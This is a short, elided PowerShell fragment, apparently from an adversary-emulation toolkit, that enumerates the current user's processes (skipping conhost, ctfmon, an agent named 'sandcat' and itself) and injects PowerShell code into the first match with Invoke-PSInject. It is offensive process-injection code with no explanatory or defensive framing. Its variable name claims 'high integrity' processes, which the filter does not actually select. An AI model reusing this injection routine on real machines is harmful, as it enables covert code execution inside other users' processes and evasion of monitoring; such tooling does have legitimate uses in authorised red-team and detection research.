...
function EnumProcesses(){
    Get-Process -IncludeUserName | Where-Object { $_.UserName -like "*\$env:USERNAME" -and $_.Name -ne "conhost" -and $_.Name -ne "ctfmon" -and $_.Name -ne "sandcat" -and $_.Id -ne $PID } | %{
...
function Inject
{
    ...
    $HighIntegrityUserOwnedProcess = @(EnumProcesses)
    Invoke-PSInject -ProcId $HighIntegrityUserOwnedProcess[0] -PoshCode $PoshCode
}